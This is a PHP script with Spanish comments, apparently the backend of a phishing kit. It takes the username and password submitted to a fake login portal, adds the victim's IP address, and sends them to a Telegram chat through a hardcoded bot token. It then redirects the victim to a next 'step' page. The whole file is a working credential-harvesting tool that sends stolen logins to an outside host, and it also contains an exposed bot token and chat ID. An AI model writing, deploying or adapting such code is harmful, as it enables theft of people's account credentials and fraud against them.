<?php
// ==========================================
// CONFIGURACIÓN DEL BOT DE TELEGRAM
// ==========================================
$botToken = "7666768336:AAHMexyFEv7ggRV5lpzA36Ldos2IUoqhhp8"; // Reemplazá con el token de @BotFather
$chatId   = "1558822548";           // Reemplazá con tu ID de chat de Telegram

// ==========================================
// CAPTURA DE DATOS DEL FORMULARIO
// ==========================================
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Obtenemos los datos del formulario de login
    $usuario = isset($_POST['usuario']) ? htmlspecialchars($_POST['usuario']) : 'No ingresado';
    $password = isset($_POST['password']) ? htmlspecialchars($_POST['password']) : 'No ingresado';
    
    // Dato extra del usuario
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Desconocida';

    // ==========================================
    // FORMATEO DEL MENSAJE
    // ==========================================
    $mensaje = "🔔 *NUEVO INGRESO AL PORTAL*\n\n";
    $mensaje .= "👤 *Usuario:* `" . $usuario . "`\n";
    $mensaje .= "🔑 *Contraseña:* `" . $password . "`\n\n";
    $mensaje .= "🌐 *IP:* `" . $ip . "`\n";

    // ==========================================
    // ENVÍO A LA API DE TELEGRAM
    // ==========================================
    $url = "https://api.telegram.org/bot" . $botToken . "/sendMessage";
    
    $data = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown'
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 

    $response = curl_exec($ch);
    $err = curl_error($ch);
    curl_close($ch);

    // ==========================================
    // REDIRECCIÓN (Corregido a index.php)
    // ==========================================
    header("Location: ../step-1.php"); 
    exit();
}
?>